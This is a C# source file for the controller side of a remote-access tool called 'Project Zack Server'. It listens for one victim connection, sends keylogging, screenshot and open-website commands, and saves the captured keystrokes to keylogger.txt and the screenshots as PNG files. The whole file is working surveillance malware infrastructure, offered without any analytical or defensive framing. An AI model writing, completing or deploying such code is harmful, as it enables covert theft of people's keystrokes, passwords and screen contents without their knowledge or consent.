using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Server
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Title = "Project Zack Server";
            new Program().StartServer();
        }

        static NetworkStream stream;

        void StartServer()
        {
            TcpListener server = null;
            try
            {
                Int32 port = 40;
                server = new TcpListener(IPAddress.Any, port);
                server.Start();


           
                String decodedData = null;

                Console.Write("Waiting for a connection... ");
                TcpClient client = server.AcceptTcpClient();
                Console.WriteLine("Connected!");
                stream = client.GetStream();

                Thread input = new Thread(ConsoleInput);
                input.Start();

                byte[] datalength = new byte[4];
                int i;
                while ((i = stream.Read(datalength, 0, 4)) != 0)
                {

                    int dataLength = BitConverter.ToInt32(datalength, 0);
                    byte[] data = new byte[dataLength];

                    int bytesReceived = 0;
                    while (bytesReceived < data.Length)
                    {
                        bytesReceived += stream.Read(data, bytesReceived, data.Length - bytesReceived);
                    }

                    decodedData = System.Text.Encoding.ASCII.GetString(data, 0, dataLength);
                    Console.WriteLine("Received: {0}", decodedData);

                    if (decodedData.ToUpper().StartsWith("DATA"))
                    {
                        StreamWriter file = new StreamWriter(Directory.GetCurrentDirectory() + "/keylogger.txt", true);
                        file.Write(decodedData.Remove(0, "DATA".Length));
                        file.Close();
                    }
                    else if (decodedData.ToUpper().StartsWith("IMAGE"))
                    {
                        Console.WriteLine("Received: {0}", "screenshot");
                        string strm = decodedData.Remove(0, "IMAGE".Length);
                        var myfilename = string.Format(@"{0}", Guid.NewGuid());
                        string filepath = (Directory.GetCurrentDirectory() + "/" + myfilename + ".png");
                        var bytess = Convert.FromBase64String(strm);
                        using (var imageFile = new FileStream(filepath, FileMode.Create))
                        {
                            imageFile.Write(bytess, 0, bytess.Length);
                            imageFile.Flush();
                        }
                        Console.WriteLine("Received: {0}", "screenshot");
                    }
                    else if (decodedData.ToUpper().StartsWith("DISCONNECT"))
                    {
                        Console.WriteLine("Received: {0}", decodedData);
                        server.Stop();
                    }
                    Console.WriteLine("==");
                }
            }
            catch (SocketException e)
            {
                Console.WriteLine("SocketException: {0}", e);
            }
            finally
            {
                server.Stop();
            }
        }
        void ConsoleInput()
        {
            while (true)
            {
                string input = Console.ReadLine().ToUpper();
                string[] Command = input.Split(' ');

                if (Command[0] == "HELP")
                {
                    Console.WriteLine("==HELP==");
                    Console.WriteLine("KEYLOG");
                    Console.WriteLine("DISCONNECT");
                    Console.WriteLine("SCREENSHOT");
                    Console.WriteLine("OPENSITE");
                }
                else if (Command[0] == "KEYLOG")
                {
                    byte[] msg = Encoding.ASCII.GetBytes("SENDKCAPTURE");
                    SendData(stream, msg);                  
                    Console.WriteLine("Sent: {0}", "SENDKCAPTURE");
                }
                else if (Command[0] == "SCREENSHOT")
                {
                    byte[] msg = Encoding.ASCII.GetBytes("SCREENSHOT");
                    SendData(stream, msg);
                    Console.WriteLine("Sent: {0}", "SCREENSHOT");
                }
                else if (Command[0] == "DISCONNECT")
                {
                    byte[] msg = Encoding.ASCII.GetBytes("DISCONNECT");
                    SendData(stream, msg);
                    Console.WriteLine("Sent: {0}", "DISCONNECT");
                }
                else if (Command[0] == "OPENSITE")
                {
                    byte[] msg = Encoding.ASCII.GetBytes("OPENSITE|" + Command[1]);
                    SendData(stream, msg);
                    Console.WriteLine("Sent: {0}", "DISCONNECT");
                }
                else
                {
                    Console.WriteLine("UNKNOWN COMMAND. TYPE HELP FOR LIST OF COMMANDS.");
                }
            }
        }

        void SendData(NetworkStream stream, byte[] data)
        {
            byte[] dataLength = BitConverter.GetBytes(data.Length);
            stream.Write(dataLength, 0, dataLength.Length);
            stream.Write(data, 0, data.Length);
        }
    }
}